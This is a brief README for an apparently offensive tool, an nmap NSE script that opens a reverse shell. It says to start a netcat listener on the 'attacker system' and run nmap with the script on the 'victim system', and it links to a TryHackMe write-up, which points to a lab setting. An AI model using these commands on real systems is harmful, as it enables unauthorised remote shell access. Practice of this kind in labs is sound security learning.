# nmap-reverse-shell
Nmap reverse shell script

## How to execute

On attacker system, execute:
```bash
netcat -lnvp 8080
```

On victim system, execute:
```bash
nmap -p<an-open-port> <host-ip> --script=reverse_shell.nse
```

## Use case scenario:
https://surajdadral.wordpress.com/2020/11/29/tryhackme-envizon/#nmap-reverse-shell
